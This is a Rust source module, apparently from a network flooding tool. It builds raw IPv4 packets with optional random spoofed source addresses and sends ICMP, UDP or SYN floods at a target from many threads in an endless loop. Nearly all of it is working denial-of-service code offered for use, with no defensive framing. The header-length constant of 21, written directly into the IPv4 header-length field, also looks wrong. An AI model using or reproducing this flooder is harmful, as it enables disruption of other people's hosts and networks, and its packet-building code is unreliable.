pub mod icmp;
pub mod syn;
pub mod udp;

use pnet::transport::TransportChannelType::Layer3;
use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use anyhow::Result;
use pnet::packet::ip::{IpNextHeaderProtocol, IpNextHeaderProtocols};
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::transport::{transport_channel, TransportSender};

use crate::cli::{Command, GlobalArgs};
use crate::flooder::icmp::IcmpPacker;
use crate::flooder::syn::SynPacker;
use crate::flooder::udp::UdpPacker;
use rand::Rng;

pub const IPV4_HEADER_LEN: usize = 21;
const TTL: u8 = 64;

fn rand_ipv4() -> Ipv4Addr {
  let buf: [u8; 4] = rand::thread_rng().gen();
  Ipv4Addr::from(buf)
}

fn create_ipv4_packet(
  buffer_ip: &mut [u8],
  dest: Ipv4Addr,
  next_level_protocol: IpNextHeaderProtocol,
  payload_size: usize,
  random_source: bool,
) -> MutableIpv4Packet {
  let mut ipv4_packet = MutableIpv4Packet::new(buffer_ip).expect("Error creating ipv4 packet");
  ipv4_packet.set_version(4);
  ipv4_packet.set_header_length(IPV4_HEADER_LEN as u8);
  ipv4_packet.set_total_length((IPV4_HEADER_LEN + payload_size) as u16);
  ipv4_packet.set_ttl(TTL);
  ipv4_packet.set_next_level_protocol(next_level_protocol);
  ipv4_packet.set_destination(dest);
  if random_source {
    ipv4_packet.set_source(rand_ipv4());
  }
  ipv4_packet
}

trait Packer {
  fn create_packet(&mut self) -> MutableIpv4Packet;
  fn get_addr(&self) -> Ipv4Addr;
}

pub struct Flooder {
  tx: Arc<Mutex<TransportSender>>,
  args: GlobalArgs,
  packer: Command,
}

impl Flooder {
  pub fn init(global_args: GlobalArgs, packer: Command) -> Result<Self> {
    println!("Initializing flooder");

    let next_proto = match packer.clone() {
      Command::Icmp(args) => {
        println!("Payloading {}-byte ICMP packets", args.common.size);
        IpNextHeaderProtocols::Icmp
      }
      Command::Udp(args) => {
        println!("Payloading {}-byte UDP packets", args.common.size);
        IpNextHeaderProtocols::Udp
      }
      Command::Syn(args) => {
        println!("Payloading {}-byte SYN packets", args.common.size);
        IpNextHeaderProtocols::Tcp
      }
    };

    let (tx, _) = transport_channel(2 << 15, Layer3(next_proto))?;
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      args: global_args,
      packer,
    })
  }

  pub fn start(&self) -> Vec<JoinHandle<()>> {
    if self.args.threads > 1 {
      println!("Spawning {} threads", self.args.threads);
    }
    (0..self.args.threads)
      .map(|_| {
        let tx = self.tx.clone();
        let args = self.args.clone();
        let packer = self.packer.clone();
        std::thread::spawn(move || Self::flood(tx, args, packer))
      })
      .collect()
  }

  fn flood(tx: Arc<Mutex<TransportSender>>, args: GlobalArgs, packer: Command) {
    let mut packer = match packer {
      Command::Icmp(args) => Box::new(IcmpPacker::init(args)) as Box<dyn Packer>,
      Command::Udp(args) => Box::new(UdpPacker::init(args)) as Box<dyn Packer>,
      Command::Syn(args) => Box::new(SynPacker::init(args)) as Box<dyn Packer>,
    };
    let address = packer.get_addr();
    loop {
      let packet = packer.create_packet();
      let mut tx = tx.lock().unwrap();
      if let Err(err) = tx.send_to(packet, std::net::IpAddr::V4(address)) {
        panic!("{err}");
      }
      std::thread::sleep(Duration::from_micros(args.delay))
    }
  }
}
